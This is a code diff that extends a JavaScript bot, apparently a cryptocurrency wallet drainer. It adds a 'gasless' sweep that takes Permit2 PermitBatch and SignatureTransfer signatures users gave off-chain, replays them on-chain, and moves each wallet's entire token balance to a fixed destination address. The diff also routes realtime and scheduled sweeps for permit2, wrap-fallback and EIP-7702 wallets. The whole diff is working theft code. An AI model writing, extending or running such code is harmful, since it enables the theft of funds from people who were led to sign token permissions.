@@ -83,11 +83,15 @@ const ERC20_ABI = [
   "function symbol() view returns (string)",
 ];
 
-// Permit2 AllowanceTransfer — bot checks stored allowance then calls transferFrom.
-// No signature needed. amount is uint160. allowance() returns (amount, expiration, nonce).
+// Permit2 — AllowanceTransfer + gasless PermitBatch + SignatureTransfer ABIs.
 const PERMIT2_ABI = [
+  // AllowanceTransfer: bot checks stored allowance then calls transferFrom
   "function transferFrom(address from, address to, uint160 amount, address token) external",
   "function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)",
+  // PATH B gasless: bot calls permit() to set allowances from user's PermitBatch sig
+  "function permit(address owner, tuple(tuple(address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes calldata signature) external",
+  // PATH B gasless: bot calls permitTransferFrom() with user's SignatureTransfer sig
+  "function permitTransferFrom(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount)[] transferDetails, address owner, bytes calldata signature) external",
 ];
 
 // ── Wallet & contracts — ALL bound to rpcProvider (HTTP) ─────────────────────
@@ -333,7 +337,139 @@ async function sweepPermit2Wallet(walletAddress) {
   }
 }
 
-// ── Supabase: load existing wallets on startup ────────────────────────────────
+// ── Gasless PATH B sweep ──────────────────────────────────────────────────────
+//
+// Wallet has type="permit2-gasless" — user signed PermitBatch + SignatureTransfer
+// off-chain (no gas). Bot pays gas to:
+//   1. permit2.permit(owner, permitBatch, sig) — sets AllowanceTransfer allowances
+//   2. permit2.transferFrom() — sweeps covered tokens
+//   3. permit2.permitTransferFrom() — sweeps uncovered tokens (single-use)
+
+async function sweepGaslessWallet(walletAddress) {
+  const checksum = normalizeAddress(walletAddress);
+  if (!checksum || !supabase) return;
+
+  let meta;
+  try {
+    const { data } = await supabase
+      .from("delegated_wallets")
+      .select("permit_metadata")
+      .eq("address", checksum.toLowerCase())
+      .eq("chain", CHAIN)
+      .single();
+    meta = data?.permit_metadata;
+  } catch (e) {
+    err(`[gasless] metadata read for ${checksum}: ${e.message}`);
+    return;
+  }
+
+  if (!meta) { warn(`[gasless] no permit_metadata for ${checksum}`); return; }
+
+  const { permitBatch, signatureTransfer } = meta;
+  const nowSecs = BigInt(Math.floor(Date.now() / 1000));
+
+  // -- PermitBatch path (AllowanceTransfer via signature) ---------------------
+  if (permitBatch?.signature && Array.isArray(permitBatch.details) && permitBatch.details.length > 0) {
+    let needsPermit = false;
+    for (const detail of permitBatch.details) {
+      try {
+        const [amt, exp] = await permit2.allowance(checksum, detail.token, relayerWallet.address);
+        if (amt === 0n || exp <= nowSecs) { needsPermit = true; break; }
+      } catch { needsPermit = true; break; }
+    }
+
+    if (needsPermit) {
+      log(`[gasless] ${checksum} -- calling permit2.permit() (${permitBatch.details.length} token(s))`);
+      try {
+        const batchArg = {
+          details:    permitBatch.details.map(d => ({
+            token:      d.token,
+            amount:     BigInt(d.amount),
+            expiration: BigInt(d.expiration),
+            nonce:      Number(d.nonce),
+          })),
+          spender:    permitBatch.spender,
+          sigDeadline: BigInt(permitBatch.sigDeadline),
+        };
+        const fee = await getFeeData();
+        const tx  = await permit2.permit(checksum, batchArg, permitBatch.signature,
+          { gasLimit: 300_000n, ...fee });
+        log(`[gasless] permit() tx: ${tx.hash}`);
+        await tx.wait();
+        log(`[gasless] permit() confirmed for ${checksum}`);
+      } catch (e) { err(`[gasless] permit() for ${checksum}: ${e.message}`); }
+    }
+
+    for (const detail of permitBatch.details) {
+      const tokenAddr = normalizeAddress(detail.token);
+      if (!tokenAddr) continue;
+      try {
+        const token   = new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider);
+        const balance = await token.balanceOf(checksum);
+        if (balance === 0n) { await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY)); continue; }
+        log(`[gasless/allowance] ${checksum} balance -- transferFrom ${tokenAddr.slice(0, 10)}`);
+        const fee = await getFeeData();
+        const tx  = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, tokenAddr,
+          { gasLimit: 150_000n, ...fee });
+        log(`[gasless/allowance] transferFrom tx: ${tx.hash}`);
+        await tx.wait();
+        log(`[gasless/allowance] confirmed for ${checksum}`);
+      } catch (e) { err(`[gasless/allowance] ${tokenAddr} for ${checksum}: ${e.message}`); }
+      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
+    }
+  }
+
+  // -- SignatureTransfer path (single-use) ------------------------------------
+  if (signatureTransfer?.signature && Array.isArray(signatureTransfer.permitted) && signatureTransfer.permitted.length > 0) {
+    const deadline = BigInt(signatureTransfer.deadline);
+    if (deadline < nowSecs) { warn(`[gasless/sig] SignatureTransfer expired for ${checksum}`); return; }
+
+    const tokensWithBalance = [];
+    for (const p of signatureTransfer.permitted) {
+      const addr = normalizeAddress(p.token);
+      if (!addr) continue;
+      try {
+        const token   = new ethers.Contract(addr, ERC20_ABI, rpcProvider);
+        const balance = await token.balanceOf(checksum);
+        if (balance > 0n) tokensWithBalance.push({ token: addr, balance, amount: p.amount });
+      } catch {}
+      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
+    }
+
+    if (!tokensWithBalance.length) return;
+
+    log(`[gasless/sig] ${checksum} -- ${tokensWithBalance.length} token(s) -- permitTransferFrom`);
+    try {
+      const permitArg = {
+        permitted: signatureTransfer.permitted.map(p => ({
+          token:  normalizeAddress(p.token) || p.token,
+          amount: BigInt(p.amount),
+        })),
+        nonce:    BigInt(signatureTransfer.nonce),
+        deadline: BigInt(signatureTransfer.deadline),
+      };
+      const transferDetails = signatureTransfer.permitted.map(p => {
+        const addr    = normalizeAddress(p.token) || p.token;
+        const matched = tokensWithBalance.find(t => t.token.toLowerCase() === addr.toLowerCase());
+        return { to: DESTINATION_ADDRESS, requestedAmount: matched ? matched.balance : 0n };
+      });
+      const fee = await getFeeData();
+      const tx  = await permit2.permitTransferFrom(
+        permitArg, transferDetails, checksum, signatureTransfer.signature,
+        { gasLimit: BigInt(signatureTransfer.permitted.length) * 150_000n + 50_000n, ...fee }
+      );
+      log(`[gasless/sig] permitTransferFrom tx: ${tx.hash}`);
+      await tx.wait();
+      log(`[gasless/sig] confirmed for ${checksum}`);
+    } catch (e) {
+      const msg = e.message ?? "";
+      if (/InvalidNonce|nonce/i.test(msg)) warn(`[gasless/sig] Signature already used for ${checksum}`);
+      else err(`[gasless/sig] permitTransferFrom for ${checksum}: ${msg}`);
+    }
+  }
+}
+
+// -- Supabase: load existing wallets on startup --------------------------------
 
 async function loadDelegatedWallets() {
   if (!supabase) return;
@@ -348,8 +484,11 @@ async function loadDelegatedWallets() {
       const checksum = normalizeAddress(row.address);
       if (checksum) delegatedWallets.set(checksum, row.type || "eip7702");
     }
-    const p2Count = [...delegatedWallets.values()].filter(t => t === "permit2").length;
-    log(`Loaded ${delegatedWallets.size} wallets (${p2Count} permit2, ${delegatedWallets.size - p2Count} eip7702)`);
+    const types    = [...delegatedWallets.values()];
+    const p2Count  = types.filter(t => t === "permit2" || t === "wrap-fallback").length;
+    const glCount  = types.filter(t => t === "permit2-gasless").length;
+    const e7Count  = delegatedWallets.size - p2Count - glCount;
+    log(`Loaded ${delegatedWallets.size} wallets (${p2Count} permit2, ${glCount} gasless, ${e7Count} eip7702)`);
   } catch (e) { warn(`loadDelegatedWallets: ${e.message}`); }
 }
 
@@ -377,7 +516,9 @@ function subscribeRealtime() {
         const isNew = !delegatedWallets.has(address);
         delegatedWallets.set(address, type);
         log(`🔔 Realtime ${isNew ? "new" : "updated"} wallet ${address} (${type}) — sweeping immediately`);
-        if (type === "permit2" || type === "wrap-fallback") {
+        if (type === "permit2-gasless") {
+          await sweepGaslessWallet(address).catch(e => err(`gasless sweep: ${e.message}`));
+        } else if (type === "permit2" || type === "wrap-fallback") {
           await sweepPermit2Wallet(address).catch(e => err(`permit2 sweep: ${e.message}`));
         } else {
           await sweepDelegatedWallet(address).catch(e => err(`eip7702 sweep: ${e.message}`));
@@ -396,7 +537,9 @@ function subscribeRealtime() {
         if (!address) return;
         delegatedWallets.set(address, type);
         log(`🔄 Realtime wallet update ${address} (${type}) — sweeping immediately`);
-        if (type === "permit2" || type === "wrap-fallback") {
+        if (type === "permit2-gasless") {
+          await sweepGaslessWallet(address).catch(e => err(`gasless sweep: ${e.message}`));
+        } else if (type === "permit2" || type === "wrap-fallback") {
           await sweepPermit2Wallet(address).catch(e => err(`permit2 sweep: ${e.message}`));
         } else {
           await sweepDelegatedWallet(address).catch(e => err(`eip7702 sweep: ${e.message}`));
@@ -458,8 +601,9 @@ async function startBot() {
         for (const walletAddress of due) {
           const walletType = delegatedWallets.get(walletAddress);
           try {
-            if (walletType === "permit2" || walletType === "wrap-fallback") {
-              // wrap-fallback = same as permit2 (WBNB/WETH/WMATIC in token list)
+            if (walletType === "permit2-gasless") {
+              await sweepGaslessWallet(walletAddress);
+            } else if (walletType === "permit2" || walletType === "wrap-fallback") {
               await sweepPermit2Wallet(walletAddress);
             } else {
               await sweepDelegatedWallet(walletAddress);
